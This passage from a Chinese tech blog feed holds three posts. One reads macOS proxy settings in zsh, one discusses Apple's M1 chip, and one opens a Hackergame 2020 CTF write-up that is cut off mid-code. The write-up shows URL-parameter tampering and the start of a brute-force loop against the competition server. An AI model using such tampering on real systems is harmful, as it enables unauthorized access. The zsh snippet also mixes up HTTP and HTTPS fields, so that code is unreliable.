的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | <span class=\"hljs-built_in\">tee</span> -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">'，'</span>).<span class=\"hljs-property\">length</span><span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span 